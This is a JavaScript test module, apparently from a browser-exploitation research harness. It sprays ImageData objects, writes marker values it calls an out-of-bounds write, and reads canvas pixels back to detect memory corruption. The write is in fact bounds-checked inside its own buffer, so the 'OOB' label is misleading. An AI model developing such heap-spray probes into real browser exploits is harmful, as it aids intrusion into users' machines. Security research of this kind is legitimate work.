// js/script2/testOOBWriteToImageData.mjs
import { logS2, PAUSE_S2, toHexS2 } from './s2_utils.mjs';
import { getInteractiveCanvasS2 } from '../dom_elements.mjs';
import { getCanvasContext2D_S2 } from '../state.mjs';

export async function testOOBWriteToImageDataCheckS2() {
    const FNAME = 'testOOBWriteToImageDataCheckS2'; 
    logS2("--- Teste: OOB Write -> ImageData Check (S2) ---",'test', FNAME); 
    const spraySize = 30; 
    const imgDataWidth = 10; 
    const imgDataHeight = 10; 
    const bufferOOBSize = 64; 
    const writeValue1 = 0x42424242; // BBGGRRAA (little-endian) -> B,B,B,B (cor)
    const writeValue2 = 0x43434343; // C,C,C,C (cor)
    const writeValueSize = 8; // 2x U32
    const allocationSize = bufferOOBSize + 256; // Buffer para a escrita OOB
    const baseOffsetInBuffer = 128; // Onde o buffer "começa"
    const sprayedImagesData = []; 
    let bufferOOB = null; 
    let dvOOB = null; 
    let oobWritePerformed = false; 
    let potentialCorruptionDetected = false; 
    let patternMatched = false; 
    
    const ctxS2 = getCanvasContext2D_S2();
    const canvasElementS2 = getInteractiveCanvasS2();

    if(!ctxS2 || !canvasElementS2){ 
        logS2("Contexto 2D (ctxS2) ou elemento canvas não disponível para put/getImageData.", 'warn', FNAME); 
        return; 
    }
    
    try { 
        bufferOOB = new ArrayBuffer(allocationSize); 
        dvOOB = new DataView(bufferOOB); 
        for(let i=0; i<bufferOOB.byteLength; i++) dvOOB.setUint8(i, 0xCC); // Padrão
    } catch(e){ 
        logS2(`Erro fatal ao alocar buffer de controle (OOB S2): ${e.message}`,'error', FNAME); 
        console.error(e); return; 
    } 
    
    // Cria os ImageData para o spray
    const totalPixels = imgDataWidth * imgDataHeight; 
    const initialByteArray = new Uint8ClampedArray(totalPixels * 4); 
    for (let j = 0; j < initialByteArray.length; j+=4) { 
        initialByteArray[j]   = 255; // R
        initialByteArray[j+1] = 255; // G
        initialByteArray[j+2] = 255; // B
        initialByteArray[j+3] = 255; // A (branco opaco)
    } 
    for(let i=0; i<spraySize; i++){ 
        try { 
            // Clona o array de bytes para cada ImageData para evitar referência compartilhada
            let imgData = new ImageData(new Uint8ClampedArray(initialByteArray), imgDataWidth, imgDataHeight); 
            sprayedImagesData.push(imgData); 
        } catch(e){ 
            logS2(`Aviso: Falha ao alocar ImageData ${i}: ${e.message}`, 'warn', FNAME); 
            break; 
        } 
    } 
    await PAUSE_S2(); 
    
    // Tenta a escrita OOB
    const oobWriteRelOffset = bufferOOBSize; 
    const targetWriteAddr = baseOffsetInBuffer + oobWriteRelOffset; 
    const relOffsetStr = `@${oobWriteRelOffset} (addr lógico ${targetWriteAddr} em dvOOB)`; 
    
    try { 
        if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){ 
            dvOOB.setUint32(targetWriteAddr, writeValue1, true); // Little-endian
            dvOOB.setUint32(targetWriteAddr + 4, writeValue2, true); 
            logS2(`Escrita OOB U32x2 @ ${relOffsetStr} OK (Val1=${toHexS2(writeValue1)}, Val2=${toHexS2(writeValue2)}).`, 'vuln', FNAME); 
            logS2(` ---> *** ALERTA: Primitivo Relevante Potencial (OOB Write S2) ***`, 'escalation', FNAME); 
            oobWritePerformed = true; 
        } else { 
            logS2(`Offset OOB ${relOffsetStr} fora do buffer de controle.`, 'error', FNAME); 
        } 
    } catch(e){ 
        logS2(`AVISO: Escrita OOB U32x2 falhou/bloqueada @ ${relOffsetStr}: ${e.message}`, 'good', FNAME); 
    } 
    
    await PAUSE_S2(); 
    
    // Desenha e verifica os ImageDatas
    ctxS2.fillStyle="#111"; // Fundo escuro para a área de desenho dos ImageDatas
    ctxS2.fillRect(0, 50, canvasElementS2.width, canvasElementS2.height - 80); // Limpa área
    
    const cols = Math.floor((canvasElementS2.width - 10) / (imgDataWidth + 1)); 
    const startYCanvas = 60; 
    
    for(let i=0; i<sprayedImagesData.length; i++){ 
        const gridX = 10 + (i % cols) * (imgDataWidth + 1); 
        const gridY = startYCanvas + Math.floor(i / cols) * (imgDataHeight + 1); 
        
        // Pula se for desenhar fora da área visível do canvas
        if (gridY + imgDataHeight > canvasElementS2.height - 15) { continue; } 
        
        try { 
            const currentImageData = sprayedImagesData[i]; 
            if (!currentImageData || !currentImageData.data) continue; 
            
            ctxS2.putImageData(currentImageData, gridX, gridY); 
            
            // Lê de volta do canvas para verificar (putImageData pode normalizar ou alterar dados)
            const readbackImageData = ctxS2.getImageData(gridX, gridY, imgDataWidth, imgDataHeight); 
            const readbackData = readbackImageData.data; 
            
            for(let k=0; k < readbackData.length; k += 4){ 
                const r = readbackData[k]; 
                const g = readbackData[k+1]; 
                const b = readbackData[k+2]; 
                const a = readbackData[k+3]; 
                
                // Se algum pixel não for mais branco (255,255,255,255), houve corrupção
                if(r !== 255 || g !== 255 || b !== 255 || a !== 255){ 
                    const pixelIndex = k / 4; 
                    logS2(`---> CORRUPÇÃO DETECTADA em ImageData ${i} @ pixel ${pixelIndex}! RGBA=(${r},${g},${b},${a})`, 'critical', FNAME); 
                    potentialCorruptionDetected = true; 
                    
                    // Verifica se o padrão escrito (writeValue1) corresponde aos bytes RGBA lidos
                    // writeValue1 = 0x42424242. Em little-endian, bytes são B2, B2, B2, B2.
                    // Se RGBA é (B2, B2, B2, B2)
                    const byteVal = 0x42; 
                    if (r === byteVal && g === byteVal && b === byteVal && a === byteVal) { 
                        patternMatched = true; 
                        logS2(`     -> PADRÃO OOB (0x${writeValue1.toString(16)}) detectado nos pixels!`, 'vuln', FNAME); 
                        logS2(` ---> *** ALERTA: Padrão OOB Write lido de volta do ImageData! Corrupção Controlada Potencial! ***`, 'escalation', FNAME); 
                    }
                    // Pode adicionar verificação para writeValue2 também se necessário
                    break; // Para de verificar este ImageData
                } 
            } 
        } catch(e){ 
            logS2(`Erro put/getImageData para ImageData ${i}: ${e.message}`, 'error', FNAME); 
            console.error(`Erro ImgData ${i}:`, e); 
            potentialCorruptionDetected = true; // Um erro aqui também é uma forma de corrupção/instabilidade
        } 
        if(patternMatched) break; // Para de verificar outros ImageDatas se o padrão foi encontrado
        if(i % 5 === 0) await PAUSE_S2(5); 
    } 
    
    if (patternMatched) { 
        logS2(`SUCESSO: Corrupção E padrão OOB lido de volta de um ImageData!`, 'vuln', FNAME); 
    } else if (potentialCorruptionDetected) { 
        logS2(`AVISO: Corrupção/Erro detectado em ImageData, mas padrão OOB específico não confirmado.`, 'warn', FNAME); 
        logS2(` ---> *** ALERTA: Corrupção de memória instável afetando ImageData! Investigar. ***`, 'escalation', FNAME); 
    } else if (oobWritePerformed) { 
        logS2(`Escrita OOB realizada, mas nenhuma corrupção detectada nos ImageDatas.`, 'good', FNAME); 
    } else { 
        logS2(`Escrita OOB não realizada/falhou e nenhuma corrupção detectada.`, 'good', FNAME); 
    } 
    logS2("--- Teste OOB Write -> ImageData Check S2 Concluído ---",'test', FNAME); 
    await PAUSE_S2();
}
